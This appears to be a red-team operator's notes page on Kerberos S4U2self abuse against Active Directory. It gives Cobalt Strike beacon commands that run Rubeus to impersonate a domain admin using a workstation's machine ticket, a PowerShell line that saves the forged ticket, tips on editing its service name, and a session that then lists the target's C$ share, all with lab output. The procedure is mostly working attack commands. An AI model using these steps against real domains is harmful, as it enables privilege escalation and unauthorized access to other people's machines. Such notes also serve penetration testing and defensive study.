# S4U2self Abuse
Gain access to a domain computer if we have its RC4, AES256 or TGT.

S4U = Service for User  
Extensions:
* S4U2self = Service for User to Self  
Allows a service to obtain a TGS to itself on behalf of a user
* S4U2proxy = Service for User to Proxy
Allows the service to obtain a TGS on behalf of a user to a second service

Gaining TGT for a computer wo local admin:
* [[Kerberos/Printer Bug]] and a machine with [[unconstrained delegation]]
* [[NTLM relaying]]
* [[Misconfigured Certificate Templates]]

Problem:  
A TGT for WKSTN2 imported into a sacrificial session cannot access C$.

Solution:  
Abuse S4U2self to obtain a TGS to itself, as a user we know **is** a local admin like a domain admin.

## Obtain a TGS to itself
```beacon
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe s4u /user:WKSTN2$ /msdsspn:cifs/wkstn2.edu.evil.corp /impersonateuser:patrick /ticket:doERz [...snip...] M= /nowrap

[*] Action: S4U
[*] Building S4U2self request for: 'WKSTN2$@edu.evil.corp'
[*] Using domain controller: dc-2.edu.evil.corp (10.10.17.71)
[*] Sending S4U2self request to 10.10.17.71:88
[+] S4U2self success!
[*] Got a TGS for 'patrick' to 'WKSTN2$@edu.evil.corp'
[*] base64(ticket.kirbi):

 doERAz [...snip...] Mtq=

[*] Impersonating user 'patrick' to target SPN 'cifs/wkstn2.edu.evil.corp'
[*] Building S4U2proxy request for service: 'cifs/wkstn2.edu.evil.corp'
[*] Using domain controller: dc-2.edu.evil.corp (10.10.17.71)
[*] Sending S4U2proxy request to domain controller 10.10.17.71:88

[X] KRB-ERROR (13) : KDC_ERR_BADOPTION
```
  
The S4U2proxy step will fail, which is fine.  Write the S4U2self TGS to a file.
```powershell
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\wkstn2-s4u.kirbi", [System.Convert]::FromBase64String("doERAz [...snip...] Mtq="))
```

Check TGT via [[Rubeus#Check stored TGT]].

The `ServiceName` of WKSTN2$ is not valid for our use - we want it to be for CIFS. This can be easily changed, since the service name is not in the encrypted part of the ticket and is not "checked".

To modify the ticket, open it with the [[ASN Editor]].

To use the ticket, simply pass it into your session.
````beacon
beacon> getuid
[*] You are EDU\john

beacon> make_token EDU\patrick FakePass
[+] Impersonated EDU\john

beacon> kerberos_ticket_use C:\Users\Administrator\Desktop\wkstn2-s4u.kirbi

beacon> ls \\wkstn2.edu.evil.corp\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 dir     05/19/2022 14:35:19   $Recycle.Bin
 dir     05/10/2022 03:23:44   Boot


 
## Tools
########
########


```meta
ttp: T1000
requirements:
results: 
description: 
```